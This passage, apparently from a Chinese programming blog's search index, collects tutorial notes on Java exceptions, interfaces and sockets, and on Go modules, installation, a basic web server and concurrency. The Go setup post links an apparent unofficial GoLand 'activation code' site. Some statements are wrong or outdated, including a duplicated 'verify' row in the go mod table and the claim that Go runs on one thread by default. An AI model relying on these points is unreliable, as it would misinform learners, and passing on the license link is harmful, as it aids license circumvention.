<h3 id="就地捕获（try-catch-finally）"><a class="header-anchor" href="#就地捕获（try-catch-finally）"></a>就地捕获（try-catch-finally）</h3>
<p>当程序发生异常时，系统捕获异常，转而执行异常处理代码。</p>
<ol>
<li>可能出现异常的代码用<code>try</code>块括起来</li>
<li>用<code>catch</code>块来捕获异常并处理异常</li>
<li>一些不论是否出现异常都需要执行的代码，用<code>finally</code>块括起来，使其一定会被执行</li>
</ol>
<p><strong>代码执行过程的三种情况</strong></p>
<ol>
<li>
<p>try代码块中无异常，try代码执行完成，则不进入不执行catch(跳过)，执行finally块，及异常块后的其他代码other code；</p>
</li>
<li>
<p>try代码块中发生异常，try代码执行到有异常处即之后中断，产生异常对象(跟踪堆栈,执行流程)，进入catch块(异常类型匹配后处理)，后执行finally块，及异常块后的其他代码other code；</p>
</li>
<li>
<p>try代码块中发生异常，产生异常对象，异常类型不匹配，或者不捕获，程序中断运行(不用try和catch块进行处理，代码在异常出停止)；</p>
</li>
</ol>
<blockquote>
<p>finally块语句唯一不执行的情况：异常处理代码catch中执行System.exit(1)退出Java虚拟机 ；</p>
<p>一段代码可能会发生多种类型的异常，当发生异常，会按顺序查看每个catch语句，并执行第一个与异常类型匹配的catch块，执行后，其他的catch语句将忽略，执行继续执行finally块，及异常块后的其他代码other code。</p>
</blockquote>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang-mod包管理</title>
    <url>/2021/07/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Golang-mod%E5%8C%85%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<p>环境变量 GO111MODULE=on 时， go modules 功能开启，go依赖包的存放和查找位置为</p>
<blockquote>
<p>$GOPATH/pkg/mod</p>
</blockquote>
<p>golang提供了 go mod 命令来使⽤ go modules 管理包</p>
<p>开启 go modules 功能后的包查找路径为<code>项⽬⽬录/vendor</code>-&gt;<code>$GOPATH/pkg/mod</code></p>
<p>该⽅式下go项⽬源码不⼀定要保存在<code>$GOPATH/src</code>⽬录下</p>
<p>mod命令</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>download</td>
<td>下载依赖包</td>
</tr>
<tr>
<td>init</td>
<td>初始化go.mod</td>
</tr>
<tr>
<td>verify</td>
<td>在当前目录初始化mod</td>
</tr>
<tr>
<td>edit</td>
<td>编辑go.mod</td>
</tr>
<tr>
<td>tidy</td>
<td>拉取缺少的模块，移除不⽤的模块</td>
</tr>
<tr>
<td>graph</td>
<td>打印模块依赖图</td>
</tr>
<tr>
<td>vendor</td>
<td>将依赖复制到项目的vendor目录下</td>
</tr>
<tr>
<td>verify</td>
<td>验证依赖是否正确</td>
</tr>
</tbody>
</table>
<p>使用示例：</p>
<p>现有源文件如下</p>
<pre><code class="hljs text">$ ls
main.go

$ cat main.go
package main
import (
	&quot;go.uber.org&#x2F;zap&quot;
)
func main() &#123;
    logger, _ :&#x3D; zap.NewProduction()
    defer logger.Sync()
    sugar :&#x3D; logger.Sugar()
    sugar.Info(&quot;hello world&quot;)
&#125;</code></pre>
<p>在项⽬⽬录下使⽤<code>go mod init</code>初始化项⽬，后⾯可以跟包名</p>
<p>如<code>go mod init github.com/jacksonyoudi/gomodone</code></p>
<p>此时项⽬⽬录下多出了<code>go.mod</code>⽂件，但⽂件中还没有描述任何引⼊包</p>
<pre><code class="hljs text">$ go mod init
go: creating new go.mod: module helloworld
$ ls
go.mod main.go
$ cat go.mod
module helloworld
go 1.16</code></pre>
<p>使⽤<code>go mod tidy</code>更新项⽬中的依赖包，此时源⽂件中的zap包被加⼊到mod⽂件中，且⽣成了最新的<code>go.sum</code>⽂件</p>
<pre><code class="hljs text">$ go mod tidy
go: finding module for package go.uber.org&#x2F;zap
go: found go.uber.org&#x2F;zap in go.uber.org&#x2F;zap v1.17.0
$ ls
go.mod go.sum main.go
$ cat go.mod
module helloworld
go 1.16
require go.uber.org&#x2F;zap v1.17.0</code></pre>
<p>go.mod⽂件⼀旦创建后，它的内容将会被go toolchain全⾯掌控。</p>
<p>go toolchain会在各类命令（如go get、go build、go mod等）执⾏时，修改和维护go.mod⽂件</p>
<blockquote>
<p>go.mod 提供了 <code>module</code>、<code>require</code>、<code>replace</code> 和 <code>exclude</code> 四个命令</p>
<p><code>module</code> 语句指定包的名字（路径）</p>
<p><code>require</code> 语句指定的依赖项模块（常用）</p>
<p><code>replace</code> 语句可以替换依赖项模块（常用)</p>
<p><code>exclude</code> 语句可以忽略依赖项模块</p>
</blockquote>
<p>⼀个典型go.mod⽂件</p>
<pre><code class="hljs go">module golang_exp
<span class="hljs-keyword">go</span> <span class="hljs-number">1.16</span>
require (
    github.com/valyala/fasthttp v1<span class="hljs-number">.26</span><span class="hljs-number">.0</span>
    <span class="hljs-keyword">go</span>.etcd.io/bbolt v1<span class="hljs-number">.3</span><span class="hljs-number">.5</span>
    golang.org/x/net v0<span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">-20210521195947</span>-fe42d452be8f
    golang.org/x/sys v0<span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">-20210521203332</span><span class="hljs-number">-0</span>cec03c779c1
    google.golang.org/genproto v0<span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">-20210524171403</span><span class="hljs-number">-669157292</span>da3
    google.golang.org/grpc v1<span class="hljs-number">.38</span><span class="hljs-number">.0</span>
)
replace (
    <span class="hljs-comment">//使用本地包来替换导入包</span>
    <span class="hljs-comment">//包导入名 =&gt; 本地包相对路径/绝对路径</span>
    firstgo/packagetest1 =&gt; ../packagetest1
    firstgo/packagetest2 =&gt; ../packagetest2
    
)</code></pre>
<p>导入本地<code>module</code>:<a href="https://www.cnblogs.com/sebuntin2020/p/12435343.html">https://www.cnblogs.com/sebuntin2020/p/12435343.html</a></p>
<p>import 如下</p>
<p><img src="/2021/07/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Golang-mod%E5%8C%85%E7%AE%A1%E7%90%86/image-20210713150318009.png" class="lazy" data-srcset="/2021/07/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Golang-mod%E5%8C%85%E7%AE%A1%E7%90%86/image-20210713150318009.png" srcset="/images/loadingImage.gif" alt="image-20210713150318009"></p>
<p>go.mod 如下</p>
<p><img src="/2021/07/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Golang-mod%E5%8C%85%E7%AE%A1%E7%90%86/image-20210713150712969.png" class="lazy" data-srcset="/2021/07/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Golang-mod%E5%8C%85%E7%AE%A1%E7%90%86/image-20210713150712969.png" srcset="/images/loadingImage.gif" alt="image-20210713150712969"></p>
<p>之所以要是 <a href="http://github.com/myModule">github.com/myModule</a> 的格式，是因为在 go1.13及以上版本 中， go module 名称规范要求路径的第一部分必须满足域名规范，否则可能会报类似 <code>malformed module path &quot;myModule&quot;: missing dot in first path element</code> 这样的错误。</p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-抽象类和接口</title>
    <url>/2020/04/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java-%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3/</url>
    <content><![CDATA[<h2 id="抽象类"><a class="header-anchor" href="#抽象类"></a>抽象类</h2>
<p>作用：主要起到一个模板的作用，抽象类中的抽象方法必须被子类实现，这样就可以使用一个统一的方法名来调用子类方法。</p>
<p>抽象类无法直接创建对象，必须被继承；抽象方法也必须在子类中被重写。</p>
<p>抽象类中的方法可以是非抽象的（即可以有方法体），但即使类中没有抽象方法，抽象类也无法被实例化；反过来，如果一个类中有抽象方法，那么这个类必须声明为抽象类。</p>
<p>抽象方法没有方法体。</p>
<p>关键字：<code>abstract</code></p>
<pre><code class="hljs plain">public abstract Class1&#123;
	public abstract void fun();
&#125;</code></pre>
<h2 id="接口"><a class="header-anchor" href="#接口"></a>接口</h2>
<p>接口和抽象类有点像，它是抽象方法的集合；</p>
<p>一个类只能继承自一个父类，但是可以实现多个接口。间接实现了多继承；</p>
<p>另外接口中可以有有成员变量，但默认都是 <code>public static final</code>的，这三个关键字可以省略；</p>
<p>接口中的方法默认都是抽象的（即不能有方法体），定义时可以不写<code>abstract</code>，实现接口的类必须实现接口中定义的所有方法，否则该类必须为抽象类。</p>
<h3 id="声明"><a class="header-anchor" href="#声明"></a>声明</h3>
<p>关键字：<code>interface</code></p>
<pre><code class="hljs plain">[访问控制关键字] interface 接口名称 [extends 其他的接口名] &#123;
        &#x2F;&#x2F; 声明变量
        &#x2F;&#x2F; 抽象方法
&#125;</code></pre>
<h3 id="实现"><a class="header-anchor" href="#实现"></a>实现</h3>
<p>关键字：<code>implements</code></p>
<pre><code class="hljs plain">public class A implements 接口名称 [,接口名称,...]&#123;
		&#x2F;&#x2F;实现接口中的方法
&#125;</code></pre>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-网络编程</title>
    <url>/2020/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="SOCKET"><a class="header-anchor" href="#SOCKET"></a>SOCKET</h2>
<p><strong>定义：<code>socket</code>即套接字，由 ip 地址和端口号两个部分组成</strong></p>
<pre><code class="hljs java">InetAddress类：

<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InetAddress <span class="hljs-title">getByName</span><span class="hljs-params">(String host)</span> <span class="hljs-comment">//根据域名获取ip</span></span>
<span class="hljs-function">    </span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InetAddress <span class="hljs-title">getLocalHost</span><span class="hljs-params">()</span> <span class="hljs-comment">//获取本地ip</span></span>
<span class="hljs-function">    </span>
<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getHostAddress</span><span class="hljs-params">()</span> <span class="hljs-comment">//获得InetAddress对象的ip地址</span></span>
<span class="hljs-function">    </span>
<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getHostName</span><span class="hljs-params">()</span> <span class="hljs-comment">//获得InetAddress对象的域名</span></span></code></pre>
<pre><code class="hljs java">Socket类：

<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Socket</span><span class="hljs-params">(InetAddress address, <span class="hljs-keyword">int</span> port)</span></span>
<span class="hljs-function">    </span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Socket</span><span class="hljs-params">(String host, <span class="hljs-keyword">int</span> port)</span></span>
<span class="hljs-function">    </span>
<span class="hljs-function"><span class="hljs-keyword">public</span> Socket <span class="hljs-title">accept</span><span class="hljs-params">()</span> <span class="hljs-comment">//服务器端接收socket连接请求，创建socket对象</span></span>
<span class="hljs-function"></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> InputStream <span class="hljs-title">getInputStream</span><span class="hljs-params">()</span> <span class="hljs-comment">//返回此套接字的输入流，用于接收网络消息</span></span>
<span class="hljs-function"></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> OutputStream <span class="hljs-title">getOutputStream</span><span class="hljs-params">()</span> <span class="hljs-comment">//返回此套接字的输出流，用于发送网络消息</span></span>
<span class="hljs-function"></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> InetAddress <span class="hljs-title">getInetAddress</span><span class="hljs-params">()</span> <span class="hljs-comment">//返回此套接字连接到的远程IP地址或null</span></span>
<span class="hljs-function">    </span>
<span class="hljs-function"><span class="hljs-keyword">public</span> InetAddress <span class="hljs-title">getLocalAddress</span><span class="hljs-params">()</span> <span class="hljs-comment">//获取套接字绑定的本地地址</span></span>
<span class="hljs-function">    </span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getPort</span><span class="hljs-params">()</span> <span class="hljs-comment">//返回此套接字连接到的远程端口号或0</span></span>
<span class="hljs-function">    </span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getLocalPort</span><span class="hljs-params">()</span> <span class="hljs-comment">//返回此套接字绑定到的本地端口或 -1</span></span>
<span class="hljs-function">    </span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">close</span><span class="hljs-params">()</span></span></code></pre>
<p><img src="/2020/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708193332767.png" class="lazy" data-srcset="/2020/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708193332767.png" srcset="/images/loadingImage.gif" alt="image-20200708193332767"></p>
<p><img src="/2020/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708213133726.png" class="lazy" data-srcset="/2020/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708213133726.png" srcset="/images/loadingImage.gif" alt="image-20200708213133726"></p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang-Web后端</title>
    <url>/2021/07/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Golang-Web%E5%90%8E%E7%AB%AF/</url>
    <content><![CDATA[<p>一个简单的web服务器</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"fmt"</span>
	<span class="hljs-string">"log"</span>
	<span class="hljs-string">"net/http"</span>
	<span class="hljs-string">"strings"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sayhelloName</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;
	r.ParseForm()  <span class="hljs-comment">//解析参数，默认是不会解析的</span>
	fmt.Println(r.Form)  <span class="hljs-comment">//这些信息是输出到服务器端的打印信息</span>
	fmt.Println(<span class="hljs-string">"path"</span>, r.URL.Path)
	fmt.Println(<span class="hljs-string">"scheme"</span>, r.URL.Scheme)
	fmt.Println(r.Form[<span class="hljs-string">"url_long"</span>])
	<span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> r.Form &#123;
		fmt.Println(<span class="hljs-string">"key:"</span>, k)
		fmt.Println(<span class="hljs-string">"val:"</span>, strings.Join(v, <span class="hljs-string">""</span>))
	&#125;
	fmt.Fprintf(w, <span class="hljs-string">"Hello astaxie!"</span>) <span class="hljs-comment">//这个写入到w的是输出到客户端的</span>
&#125;
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sayGoodBye</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;
	fmt.Fprintf(w, <span class="hljs-string">"Goodbye astaxie!"</span>)
&#125;

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;
	http.HandleFunc(<span class="hljs-string">"/"</span>, sayhelloName) <span class="hljs-comment">//设置访问的路由</span>
    http.HandleFunc(<span class="hljs-string">"/bye"</span>, sayGoodBye)
	err := http.ListenAndServe(<span class="hljs-string">":9090"</span>, <span class="hljs-literal">nil</span>) <span class="hljs-comment">//设置监听的端口</span>
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;
		log.Fatal(<span class="hljs-string">"ListenAndServe: "</span>, err)
	&#125;
&#125;</code></pre>
<p>我们只需要使用http包的两个函数——<code>HandleFunc()</code>和<code>ListenAndServe()</code>，就可以启动一个简单的web服务。</p>
<p><code>ListenAndServer()</code>监听服务端口并在http请求到来时调用<code>HandleFunc()</code>进行处理</p>
<p><code>HandleFunc()</code>会根据http请求路径的不同调用不同的逻辑处理函数</p>
<p>Go作web服务器不需要nginx/apache，因为它直接监听了tcp端口，做了nginx的事情，而且这个Web服务内部有支持高并发的特性</p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang-安装配置</title>
    <url>/2021/07/14/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Golang-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="下载安装"><a class="header-anchor" href="#下载安装"></a>下载安装</h2>
<p>下载地址：<a href="https://golang.google.cn/">https://golang.google.cn/</a></p>
<p>安装后会自动添加环境变量</p>
<p>运行安装程序完成后查看go版本，验证是否已正确安装</p>
<pre><code class="hljs shell">go version    #查看版本</code></pre>
<h2 id="配置"><a class="header-anchor" href="#配置"></a>配置</h2>
<h3 id="env配置"><a class="header-anchor" href="#env配置"></a>env配置</h3>
<pre><code class="hljs shell">go env    #查看go环境变量
go env -w [环境变量名]=[变量值]    #写入环境变量（go version &gt; 1.13）</code></pre>
<p><img src="/2021/07/14/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Golang-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/image-20210709091726706.png" class="lazy" data-srcset="/2021/07/14/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Golang-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/image-20210709091726706.png" srcset="/images/loadingImage.gif" alt="image-20210709091726706"></p>
<p>主要需要配置GOPATH（项目工作目录）、GOPROXY（go获取依赖包的代理服务器，proxy可以设置多个，⽤逗号<code>,</code>分隔，其中<code>direct</code>为直连）、GOPRIVATE（go get通过代理服务拉取私有仓库时，匹配那些不⾛代理的私有仓库）</p>
<pre><code class="hljs plain">GOPROXY&#x3D;&quot;https:&#x2F;&#x2F;goproxy.cn,https:&#x2F;&#x2F;goproxy.io,direct&quot;
GOPRIVATE&#x3D;&quot;*.gitlab.com,*.gitee.com&quot;</code></pre>
<h3 id="IDE配置"><a class="header-anchor" href="#IDE配置"></a>IDE配置</h3>
<h4 id="goland"><a class="header-anchor" href="#goland"></a>goland</h4>
<p>goland:<a href="https://www.jetbrains.com/go/">https://www.jetbrains.com/go/</a></p>
<p>Activation code:<a href="http://vrg123.com/">http://vrg123.com/</a></p>
<h4 id="VSCode"><a class="header-anchor" href="#VSCode"></a>VSCode</h4>
<p>配置步骤：<a href="https://m.imooc.com/wiki/golesson-vscodeinstall?ishidefooter=true">https://m.imooc.com/wiki/golesson-vscodeinstall?ishidefooter=true</a></p>
<p>更多配置：<a href="http://c.biancheng.net/view/6170.html">http://c.biancheng.net/view/6170.html</a></p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang-并发</title>
    <url>/2021/07/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Golang-%E5%B9%B6%E5%8F%91/</url>
    <content><![CDATA[<h2 id="goroutine"><a class="header-anchor" href="#goroutine"></a>goroutine</h2>
<p>goroutine是Go并行设计的核心。goroutine说到底其实就是线程，但是它比线程更小，十几个goroutine可能体现在底层就是五六个线程，Go语言内部帮你实现了这些goroutine之间的内存共享。执行goroutine只需极少的栈内存(大概是4~5KB)，当然会根据相应的数据伸缩。也正因为如此，可同时运行成千上万个并发任务。goroutine比thread更易用、更高效、更轻便。</p>
<pre><code class="hljs go"><span class="hljs-comment">//通过关键字go就启动了一个goroutine</span>
<span class="hljs-keyword">go</span> hello(a, b, c)</code></pre>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"fmt"</span>
    <span class="hljs-string">"runtime"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">say</span><span class="hljs-params">(s <span class="hljs-keyword">string</span>)</span></span> &#123;
    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++ &#123;
        runtime.Gosched()	<span class="hljs-comment">//时间片轮转</span>
        fmt.Println(s)
    &#125;
&#125;

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;
    <span class="hljs-keyword">go</span> say(<span class="hljs-string">"world"</span>) <span class="hljs-comment">//开一个新的Goroutines执行</span>
    say(<span class="hljs-string">"hello"</span>) <span class="hljs-comment">//当前Goroutines执行</span>
&#125;

<span class="hljs-comment">// 以上程序执行后将输出：</span>
<span class="hljs-comment">// 每次运行结果可能不同</span></code></pre>
<p>默认情况下，调度器仅使用单线程，也就是说只实现了并发。想要发挥多核处理器的并行，需要在我们的程序中显式调用 <code>runtime.GOMAXPROCS(n) </code>告诉调度器同时使用多个线程。GOMAXPROCS 设置了同时运行逻辑代码的系统线程的最大数量，并返回之前的设置。如果n &lt; 1，不会改变当前设置。以后Go的新版本中调度得到改进后，这将被移除。</p>
<h2 id="channel"><a class="header-anchor" href="#channel"></a>channel</h2>
<p>在线程之间常常使用channel（通道）进行通信</p>
<h3 id="channel的声明"><a class="header-anchor" href="#channel的声明"></a>channel的声明</h3>
<p>定义一个channel时，也需要定义发送到channel的值的类型。注意，必须使用make 创建channel：</p>
<pre><code class="hljs go">ci := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)
cs := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>)
cf := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">interface</span>&#123;&#125;)</code></pre>
<p>channel通过操作符<code>&lt;-</code>来接收和发送数据</p>
<pre><code class="hljs go">ch &lt;- v    <span class="hljs-comment">// 发送v到channel ch.</span>
v := &lt;-ch  <span class="hljs-comment">// 从ch中接收数据，并赋值给v</span></code></pre>
<h3 id="channel的阻塞机制"><a class="header-anchor" href="#channel的阻塞机制"></a>channel的阻塞机制</h3>
<p>默认情况下，channel的发送和接收都是阻塞的，只有当发送方和接收方都准备好时才能成功传输数据。例如当发送线程想要发送数据到channel1，而暂时没有线程接收消息，那么该发送线程阻塞，直到有线程从channel1接收消息。</p>
<h3 id="Buffered-Channels"><a class="header-anchor" href="#Buffered-Channels"></a>Buffered Channels</h3>
<p>当我们不想让channel阻塞时，可以给每个channel设置缓存区</p>
<pre><code class="hljs go">ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">type</span>, n)

n == <span class="hljs-number">0</span> ! 无缓存（阻塞）
n &gt; <span class="hljs-number">0</span> ! 缓存（非阻塞，直到 n 个元素）</code></pre>
<p><code>ch:= make(chan bool, 4)</code>，创建了可以存储4个元素的bool 型channel。在这个channel 中，前4个元素可以无阻塞的写入。当写入第5个元素时，代码将会阻塞，直到其他goroutine从channel 中读取一些元素，腾出空间</p>
<h3 id="range-and-close"><a class="header-anchor" href="#range-and-close"></a>range and close</h3>
<p>channel 和slice、map一样，可以使用range在for循环中读取出数值</p>
<p><code>for i := range c</code>能够不断的读取channel里面的数据，直到该channel被显式的关闭（<code>close(c)</code>）</p>
<p>在消费方可以通过语法<code>v, ok := &lt;-ch</code>测试channel是否被关闭。如果ok返回false，那么说明channel已经没有任何数据并且已经被关闭。</p>
<p>记住应该在生产者的地方关闭channel，而不是消费的地方去关闭它，这样容易引起panic</p>
<p>另外记住一点的就是channel不像文件之类的，不需要经常去关闭，只有当你确实没有任何发送数据了，或者你想显式的结束range循环之类的</p>
<h3 id="select"><a class="header-anchor" href="#select"></a>select</h3>
<p>select 用于处理多个channel，与 switch 语句相比，select 有比较多的限制，其中最大的一条限制就是每个 case 语句里必须是一个 IO 操作，大致的结构如下：</p>
<pre><code class="hljs go"><span class="hljs-keyword">select</span> &#123;
  <span class="hljs-keyword">case</span> &lt;-chan1:
  <span class="hljs-comment">// 如果chan1成功读到数据，则进行该case处理语句</span>
  <span class="hljs-keyword">case</span> chan2 &lt;- <span class="hljs-number">1</span>:
  <span class="hljs-comment">// 如果成功向chan2写入数据，则进行该case处理语句</span>
  <span class="hljs-keyword">default</span>:
  <span class="hljs-comment">// 如果上面都没有成功，则进入default处理流程</span>
&#125;</code></pre>
<p>在一个 select 语句中，Go语言会按顺序从头至尾评估每一个发送和接收的语句。</p>
<p>如果其中的任意一语句可以继续执行（即没有被阻塞），那么就从那些可以执行的语句中任意选择一条来使用。</p>
<p>如果没有任意一条语句可以执行（即所有的通道都被阻塞），那么有如下两种可能的情况：</p>
<ul>
<li>如果给出了 default 语句，那么就会执行 default 语句，同时程序的执行会从 select 语句后的语句中恢复；</li>
<li>如果没有 default 语句，那么 select 语句将被阻塞，直到至少有一个通信可以进行下去。</li>
</ul>
<p>select常用于做超时处理</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"fmt"</span>
    <span class="hljs-string">"time"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;
    ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)
    quit := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">bool</span>)

    <span class="hljs-comment">//新开一个协程</span>
    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;
        <span class="hljs-keyword">for</span> &#123;
            <span class="hljs-keyword">select</span> &#123;
            <span class="hljs-keyword">case</span> num := &lt;-ch:
                fmt.Println(<span class="hljs-string">"num = "</span>, num)
            <span class="hljs-keyword">case</span> &lt;-time.After(<span class="hljs-number">3</span> * time.Second):
                fmt.Println(<span class="hljs-string">"超时"</span>)
                quit &lt;- <span class="hljs-literal">true</span>
            &#125;
        &#125;

    &#125;() <span class="hljs-comment">//别忘了()</span>

    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++ &#123;
        ch &lt;- i
        time.Sleep(time.Second)
    &#125;

    &lt;-quit
    fmt.Println(<span class="hljs-string">"程序结束"</span>)
&#125;</code></pre>
<p>运行结果如下：</p>
<blockquote>
<p>num = 0<br>
num = 1<br>
num = 2<br>
num = 3<br>
num = 4<br>
超时<br>
程序结束</p>
</blockquote>
<h2 id="runtime-goroutine"><a class="header-anchor" href="#runtime-goroutine"></a>runtime goroutine</h2>
<p>runtime包中有几个处理goroutine的函数：</p>
<ul>
<li>
<p>Goexit</p>
<p>退出当前执行的goroutine，但是defer函数还会继续调用</p>
</li>
<li>
<p>Gosched</p>
<p>让出当前goroutine的执行权限，调度器安排其他等待的任务运行，并在下次某个时候从该位置恢复执行。</p>
</li>
<li>
<p>NumCPU</p>
<p>返回 CPU 核数量</p>
</li>
<li>
<p>NumGoroutine</p>
<p>返回正在执行和排队的任务总数</p>
</li>
<li>
<p>GOMAXPROCS</p>
<p>用来设置可以并行计算的CPU核数的最大值，并返回之前的值。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
